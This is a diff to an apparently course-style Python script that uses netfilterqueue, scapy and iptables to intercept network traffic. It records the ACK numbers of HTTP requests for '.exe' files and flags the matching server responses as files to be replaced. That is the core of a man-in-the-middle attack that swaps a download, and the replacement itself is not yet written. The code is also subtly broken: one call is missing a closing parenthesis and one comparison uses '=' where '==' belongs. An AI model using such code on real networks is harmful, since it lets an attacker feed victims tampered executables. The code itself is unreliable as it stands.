@@ -14,6 +14,8 @@ import netfilterqueue
 import scapy.all as scapy
 import subprocess
 
+ack_list = [] #
+
 def set_iptables():
     print("\n[+] Setting up IPTables\n")
     #python3 code:
@@ -27,7 +29,7 @@ def restore_iptables():
     print("\n[+] Flushing IPTables\n")
     #subprocess.run(["iptables", "--flush"])
     subprocess.call(["iptables", "--flush"])
-
+    
 def process_packet(packet):
     scapy_packet = scapy.IP(packet.get_payload()) #store packet as a variable;
     #wrapped in scapy layer that lets you access layers of packet using scapy;
@@ -38,10 +40,13 @@ def process_packet(packet):
             print(scapy_packet.show())
             if ".exe" in scapy_packet[scapy.Raw].load:
                 print("EXE found")
+                ack_list.append(scapy_packet[scapy.TCP].ack #append TCP ACK field to list
                 print(scapy_packet.show())
         elif scapy_packet[scapy.TCP].sport = 80: #if this exists, packet is HTTP response inbound
-            print("\nHTTP Response inbound found:\n")
-            print(scapy_packet.show())
+            if scapy_packet[scapy.TCP].seq in ack_list: #if SEQ is in ack list, there are packets that match
+                print("++Replacing file")
+                #print("\nHTTP Response inbound found:\n")
+                print(scapy_packet.show())
             
         #print(scapy_packet.show()) #print out any packet with a RAW layer;
         #this will show packets that have HTTP requests, so it can be narrowed
